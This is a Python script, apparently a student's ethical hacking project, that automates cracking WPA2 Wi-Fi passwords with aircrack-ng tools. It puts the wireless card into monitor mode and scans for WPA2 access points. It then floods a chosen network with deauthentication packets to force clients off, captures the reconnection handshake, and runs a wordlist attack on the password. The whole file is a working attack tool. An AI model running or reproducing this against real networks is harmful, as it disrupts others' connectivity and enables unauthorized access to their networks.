#!/usr/bin/env python

from __future__ import print_function

import os, subprocess, select, time, signal, sys
from multiprocessing import Process

SECONDS = 20
#WORDLIST = "/usr/share/wordlists/rockyou.txt"
#WORDLIST = "/root/Documents/cs378/ethical_hacking_final_project/test.txt"
WORDLIST = "test.txt"

if os.geteuid() != 0:
    print("\nThis script must be run as root\n")
    exit(0)

def get_interface():

    # Get a monitor mode network device from iwconfig
    p2 = subprocess.Popen("iwconfig".split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p2.communicate()
    result = err + out
    managed = ""
    interfaces = []
    for r in result.split("\n\n"):
        interface = r.split()[0]
        interfaces.append(interface)
        if "Managed" or "Promiscous" in r:
            managed = interface
    return managed

def network_setup(int_name):
    try:
        out = subprocess.check_output("airmon-ng check kill".split(" "))
        out = subprocess.check_output("/etc/init.d/avahi-daemon stop".split(" "))
        out = subprocess.check_output("ifconfig {} down".format(int_name).split(" "))
        out = subprocess.check_output("airmon-ng start {}".format(int_name).split(" "))
        cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        int_name = str(os.popen(cmd).read()).strip('\n')
        return int_name
    except KeyboardInterrupt:
        print ("The network setup failed, run the script again")

def network_teardown(int_name):
    try:
        out = subprocess.check_output("airmon-ng stop {}".format(int_name).split(" "))
        out = subprocess.check_output("service network-manager restart".split(" "))
    except NameError:
        print("Network Interface \"%s\" does not exist" %int_name)

def get_bssids(interface_name):
    print('getting bssids')
    p = subprocess.Popen("airodump-ng -a -w testcap -t WPA2 {}".format(interface_name).split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    _poll = select.poll()
    _poll.register(p.stderr)

    start = time.time()
    output = []
    out2 = ""
    while time.time() - start < 7:
        rlist = _poll.poll()
        for fd, event in rlist:
            out2 += os.read(fd, 2048)

    _poll.unregister(p.stderr)
    #p.terminate()
    p.send_signal(signal.SIGINT)

    bssid_map = {}
    processes = []
    out2arr = out2.split("\x1b[J\x1b[1;1H\n")
    for i in range(1, len(out2arr)):
        info = out2arr[i].split("BSSID              STATION            PWR   Rate    Lost    Frames  Probe")[0]
        lines = info.split("\n")[4:-2]
        for line in lines:
            data = line.split()

            bssid = {
                    "BSSID": data[0], 
                    "Pwr": data[1],
                    "Beacons": data[2],
                    "Data": data[3],
                    "NUM_PER_S": data[4],
                    "CH": data[5],
                    "MB": data[6],
                    "ENC": data[7],
                    "CIPHER": "",
                    "AUTH": "",
            }
            if bssid["ENC"] == "WPA2":
                bssid["CIPHER"] = data[8]
                bssid["AUTH"] = data[9]
                bssid["ESSID"] = ' '.join(data[10:])
            elif bssid["ENC"] == "WEP":
                bssid["CIPHER"] = data[8]
                bssid["ESSID"] = ' '.join(data[9:])
            elif bssid["ENC"] == "OPN" or bssid["ENC"] == "WPA":
                bssid["ESSID"] = data[8:]
            else:
                bssid["ESSID"] = ' '.join(data[8:])

            # For testing
            #if bssid["ENC"] == "WPA2" and bssid["BSSID"] == "98:DE:D0:21:12:0F" and bssid["BSSID"] not in bssid_map:
            if bssid["ENC"] == "WPA2" and bssid["BSSID"] not in bssid_map:
                bssid_map[bssid["BSSID"]] = bssid

    return bssid_map

def deauth_bomb(bssid, channel, int_name, number_deauth_packets):
    try:
        print("airmon-ng stop {0}".format(int_name))
        out = subprocess.check_output("airmon-ng stop {0}".format(int_name).split(" "))
        print("airmon-ng start {0} {1}".format(int_name[:-3], channel))
        out = subprocess.check_output("airmon-ng start {0} {1}".format(int_name[:-3], channel).split(" "))
        time.sleep(2)

        cmd = "aireplay-ng -0 " + str(number_deauth_packets) + " -a " + bssid + " " + int_name
        print(cmd)
        subprocess.call(cmd, shell=True)
        return bssid, channel

    except KeyboardInterrupt:
        return bssid

def capture_handshake(bssid, int_name, channel):
    try:
        cmd = "airodump-ng --bssid {0} --channel {1},{1} -w handshake_{0} {2}".format(bssid, channel, int_name)
        p = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(5)
        p.send_signal(signal.SIGINT)

    except KeyboardInterrupt:
        print ("nothing")

if __name__ == "__main__":

    os.system("rm testcap*")
    os.system("rm handshake*")

    interface_name = get_interface() 
    print("interface_name: {}".format(interface_name))
    int_name = network_setup(interface_name)
    print("int_name: {}".format(int_name))

    try:
        bssids = get_bssids(int_name)
        list_bssids = bssids.keys()
        if len(list_bssids) == 0:
            print("list is empty")
            sys.exit(0)
        else:
            print("[{0}]:\t{1}\t\t{3}\t{2}".format("Index", "BSSID", "ESSID", "Channel #"))
            for i in range(len(list_bssids)):
                print("[{0}]:\t{1}\t{3}\t\t{2}".format(i, bssids[list_bssids[i]]["BSSID"], bssids[list_bssids[i]]["ESSID"], bssids[list_bssids[i]]["CH"]))
            bssid_id = int(raw_input("Select index of BSSID(0-{0}) to crack: ".format(len(list_bssids)-1)))
            print(bssid_id)
            bssid = bssids[list_bssids[bssid_id]]
            print(bssid["ESSID"])

        bssid, channel = deauth_bomb(bssid["BSSID"], bssid["CH"], int_name, SECONDS)
        print("bssid:{0}\tchannel:{1}".format(bssid, channel))

        capture_handshake(bssid, int_name, channel)
    finally:
        network_teardown(int_name)

    print("cracking password for bssid: {}".format(bssid))
    #cmd = "aircrack-ng -w test.txt -b " + bssid + " captured_packet-01.cap"
    cmd = "aircrack-ng -w test.txt -b {0} handshake_{0}-01.cap".format(bssid)
    #cmd = "aircrack-ng -w test.txt -b {0} hello-02.cap".format(bssid)
    subprocess.call(cmd, shell=True)
